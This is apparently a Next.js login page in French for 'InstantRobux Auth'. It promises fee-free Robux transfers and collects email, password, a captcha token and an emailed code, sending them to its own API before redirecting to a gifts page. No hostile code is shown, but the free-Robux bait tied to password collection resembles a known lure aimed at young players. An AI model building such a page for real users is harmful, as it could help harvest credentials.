"use client";

import { FormEvent, useState } from "react";
import { signInWithPopup } from "firebase/auth";
import { FcGoogle } from "react-icons/fc";
import ReCAPTCHA from "react-google-recaptcha";
import { getFirebaseAuth, googleProvider } from "@/lib/firebase";

type Status = "idle" | "loading" | "success" | "error";

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [code, setCode] = useState("");
  const [showCode, setShowCode] = useState(false);
  const [captchaToken, setCaptchaToken] = useState<string | null>(null);
  const [message, setMessage] = useState("");
  const [status, setStatus] = useState<Status>("idle");

  async function sendCode(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setStatus("loading");
    setMessage("Envoi du code...");

    const response = await fetch("/api/send-code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password, captchaToken }),
    });

    const data = await response.json();

    if (!response.ok || !data.success) {
      setStatus("error");
      setMessage(data.message || "Impossible d'envoyer le code");
      return;
    }

    setShowCode(true);
    setStatus("success");
    setMessage(data.message || "Code envoye");
  }

  async function verifyCode() {
    setStatus("loading");
    setMessage("Verification du code...");

    const response = await fetch("/api/verify-code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, code }),
    });

    const data = await response.json();

    if (!response.ok || !data.success) {
      setStatus("error");
      setMessage(data.message || "Code invalide");
      return;
    }

    setStatus("success");
    setMessage(data.message || "Connexion validee");
    window.location.href = data.redirect || "/cadeaux";
  }

  async function signInWithGoogle() {
    setStatus("loading");
    setMessage("Connexion avec Google...");

    try {
      const auth = getFirebaseAuth();
      const result = await signInWithPopup(auth, googleProvider);
      const googleEmail = result.user.email;

      if (!googleEmail) {
        throw new Error("Missing Google email");
      }

      const response = await fetch("/api/google-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: googleEmail }),
      });
      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || "Google login failed");
      }

      window.location.href = data.redirect || "/cadeaux";
    } catch (error) {
      console.error("google sign-in error", error);
      setStatus("error");
      setMessage("Connexion Google impossible");
    }
  }

  const isLoading = status === "loading";
  const canSendCode = Boolean(captchaToken) && email.length > 0 && password.length >= 6;

  return (
    <div className="min-h-screen bg-[#111111] px-3 py-5 text-[#e7e7e7] sm:px-4 sm:py-8">
      <main className="mx-auto grid min-h-[calc(100vh-2.5rem)] w-full max-w-5xl items-start gap-7 md:min-h-[calc(100vh-4rem)] md:grid-cols-[1.05fr_0.95fr] md:items-center md:gap-8">
        <section className="space-y-5 md:space-y-7">
          <div className="inline-flex rounded-full border border-[#2a2a2a] bg-[#1a1a1a] px-4 py-2 text-sm font-semibold text-[#ff5a00]">
            Authentification par mail
          </div>
          <div className="space-y-5">
            <h1 className="max-w-2xl text-3xl font-bold leading-tight text-white sm:text-4xl md:text-6xl">
              Envoyer des robux sans frais a vos amis.
            </h1>
            <p className="max-w-xl text-sm leading-6 text-[#a7a7a7] sm:text-base sm:leading-7 md:text-lg">
              Entrez votre email, choisissez votre mot de passe, puis validez le
              code recu par email.
            </p>
          </div>
        </section>

        <section className="overflow-hidden rounded-xl border border-[#2a2a2a] bg-[#1a1a1a] shadow-2xl shadow-black/30">
          <div className="bg-[#ff5a00] px-5 py-4 text-center sm:px-7 sm:py-5">
            <p className="text-lg font-bold text-white">InstantRobux Auth</p>
          </div>
          <form className="space-y-5 p-5 sm:p-7" onSubmit={sendCode}>
            <div className="space-y-2 text-center">
              <h2 className="text-2xl font-bold text-white">
                Connexion securisee
              </h2>
              <p className="text-sm text-[#9b9b9b]">
                Email + mot de passe + captcha + code par mail
              </p>
            </div>

            <label className="block space-y-2">
              <span className="text-sm font-semibold text-[#d7d7d7]">
                Email
              </span>
              <input
                className="w-full rounded-md border border-[#2a2a2a] bg-[#0d0d0d] px-4 py-3 text-white outline-none transition focus:border-[#ff5a00] focus:ring-2 focus:ring-[#ff5a00]/25"
                onChange={(event) => setEmail(event.target.value)}
                placeholder="vous@exemple.com"
                required
                type="email"
                value={email}
              />
            </label>

            {email ? (
              <label className="block space-y-2">
                <span className="text-sm font-semibold text-[#d7d7d7]">
                  Mot de passe
                </span>
                <input
                  className="w-full rounded-md border border-[#2a2a2a] bg-[#0d0d0d] px-4 py-3 text-white outline-none transition focus:border-[#ff5a00] focus:ring-2 focus:ring-[#ff5a00]/25"
                  minLength={6}
                  onChange={(event) => setPassword(event.target.value)}
                  placeholder="6 caracteres minimum"
                  required
                  type="password"
                  value={password}
                />
              </label>
            ) : null}

            <div className="flex max-w-full justify-center overflow-hidden rounded-lg border border-[#2a2a2a] bg-[#0d0d0d] p-2 sm:p-3">
              {process.env.NEXT_PUBLIC_RECAPTCHA_SITE_KEY ? (
                <div className="origin-center scale-[0.86] sm:scale-100">
                  <ReCAPTCHA
                    onChange={(token) => setCaptchaToken(token)}
                    onExpired={() => setCaptchaToken(null)}
                    sitekey={process.env.NEXT_PUBLIC_RECAPTCHA_SITE_KEY}
                    theme="dark"
                  />
                </div>
              ) : (
                <p className="text-center text-sm text-[#e05c5c]">
                  Variable NEXT_PUBLIC_RECAPTCHA_SITE_KEY manquante.
                </p>
              )}
            </div>

            {canSendCode ? (
              <button
                className="w-full rounded-md bg-[#ff5a00] px-4 py-3 font-bold text-white transition hover:bg-[#ff7a1a] disabled:cursor-not-allowed disabled:opacity-70"
                disabled={isLoading}
                type="submit"
              >
                {isLoading && !showCode ? "Envoi..." : "Envoyer le code"}
              </button>
            ) : null}

            <div className="flex items-center gap-3 text-xs font-bold uppercase tracking-[0.18em] text-[#666666]">
              <span className="h-px flex-1 bg-[#2a2a2a]" />
              ou
              <span className="h-px flex-1 bg-[#2a2a2a]" />
            </div>

            <button
              className="flex w-full items-center justify-center gap-3 rounded-md border border-[#2a2a2a] bg-[#0d0d0d] px-4 py-3 text-sm font-bold text-white transition hover:border-[#ff5a00] hover:bg-[#1a120d] disabled:cursor-not-allowed disabled:opacity-70 sm:text-base"
              disabled={isLoading}
              onClick={signInWithGoogle}
              type="button"
            >
              <FcGoogle className="text-xl" />
              Connexion avec Google
            </button>

            {showCode ? (
              <div className="space-y-4">
                <label className="block space-y-2">
                  <span className="text-sm font-semibold text-[#d7d7d7]">
                    Code
                  </span>
                  <input
                    className="w-full rounded-md border border-[#2a2a2a] bg-[#0d0d0d] px-4 py-3 text-white outline-none transition focus:border-[#ff5a00] focus:ring-2 focus:ring-[#ff5a00]/25"
                    inputMode="numeric"
                    maxLength={6}
                    onChange={(event) => setCode(event.target.value)}
                    placeholder="123456"
                    value={code}
                  />
                </label>
                <button
                  className="w-full rounded-md border border-[#ff5a00] px-4 py-3 font-bold text-[#ff7a1a] transition hover:bg-[#ff5a00] hover:text-white disabled:cursor-not-allowed disabled:opacity-70"
                  disabled={isLoading || code.length < 6}
                  onClick={verifyCode}
                  type="button"
                >
                  {isLoading ? "Verification..." : "Verifier"}
                </button>
              </div>
            ) : null}

            {message ? (
              <p
                className={`min-h-5 text-center text-sm ${
                  status === "error" ? "text-[#e05c5c]" : "text-[#6fbd45]"
                }`}
              >
                {message}
              </p>
            ) : null}
          </form>
        </section>
      </main>
    </div>
  );
}
